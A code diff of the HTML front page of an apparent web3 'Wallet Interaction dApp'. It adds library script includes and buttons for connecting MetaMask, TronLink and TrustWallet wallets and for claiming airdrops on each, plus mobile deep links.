@@ -1,27 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Multi-Network DApp</title>
+  <title>Wallet Interaction dApp</title>
+
+  <!-- Link to external CSS file -->
   <link rel="stylesheet" href="css/styles.css">
+
+  <!-- Web3.js CDN (MetaMask, TrustWallet, etc.) -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
+  
+  <!-- MetaMask CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider"></script>
+
+  <!-- TronLink CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@tronlink/tronlink.js"></script>
+
+  <!-- Include main JavaScript file -->
+  <script src="js/javascript.js" defer></script>
+
+  <!-- Debugging purposes -->
+  <script>
+    console.debug('index.html loaded');
+  </script>
 </head>
+
 <body>
-  <h1>Multi-Network DApp</h1>
-  <button id="connect-metamask">Connect MetaMask</button>
-  <button id="claim-airdrop">Claim Airdrop</button>
+  <div class="container">
+    <h1>Welcome to the Wallet Interaction dApp</h1>
 
-  <!-- MetaMask and Web3 CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+    <!-- Buttons for connecting wallets and claiming airdrops -->
+    <div id="wallet-buttons">
+      <!-- MetaMask Connection and Airdrop Button -->
+      <button id="connectButton">Connect MetaMask</button>
+      <button id="claimAirdropButton" disabled>Claim Airdrop</button>
 
-  <!-- Tron Web CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+      <!-- TronLink Connection and Airdrop Button -->
+      <button id="connectTronlinkButton">Connect TronLink</button>
+      <button id="claimTronAirdropButton" disabled>Claim Tron Airdrop</button>
 
-  <!-- Custom JS Files -->
-  <script src="js/common.js"></script> <!-- Load common.js first -->
-  <script src="js/loader.js"></script> <!-- Load loader.js after common.js -->
+      <!-- TrustWallet Connection and Airdrop Button -->
+      <button id="connectTrustwalletButton">Connect TrustWallet</button>
+      <button id="claimTrustwalletAirdropButton" disabled>Claim TrustWallet Airdrop</button>
+    </div>
+
+    <!-- Mobile-specific instructions for deep-linking -->
+    <div id="mobile-deep-link">
+      <p id="mobile-message">Use the links below to connect on mobile:</p>
+      <a href="metamask://">Connect MetaMask (Mobile)</a>
+      <a href="tronlink://">Connect TronLink (Mobile)</a>
+      <a href="trust://">Connect TrustWallet (Mobile)</a>
+    </div>
+  </div>
+
+  <!-- Loading Screen (optional) -->
+  <div id="loader" style="display:none;">Loading...</div>
+
 </body>
+
 </html>
 
 
